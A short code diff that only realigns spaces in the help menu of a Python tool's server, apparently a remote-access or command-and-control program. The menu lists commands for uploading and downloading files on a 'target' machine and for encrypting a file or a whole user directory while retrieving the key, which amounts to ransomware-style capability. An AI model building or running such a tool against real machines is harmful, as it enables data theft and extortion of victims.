@@ -142,8 +142,8 @@ def server_help_manual():
     quit                                --> Quit Session With The Target
     info                                --> General Host Information
     cd <directory name>                 --> Changes Directory On Target System
-    put <file name>                  --> Upload File To The Target Machine From Working Dir 
-    get <file name>                --> Download File From Target Machine
+    put <file name>                     --> Upload File To The Target Machine From Working Dir 
+    get <file name>                     --> Download File From Target Machine
     encrypt <file name>                 --> Encrpyt File in Current Directory and retrieve the key
     encrypt_user_dir <username>         --> Encrypt User Directory Files and retrieve the key
                                             Please remove all spaces from username
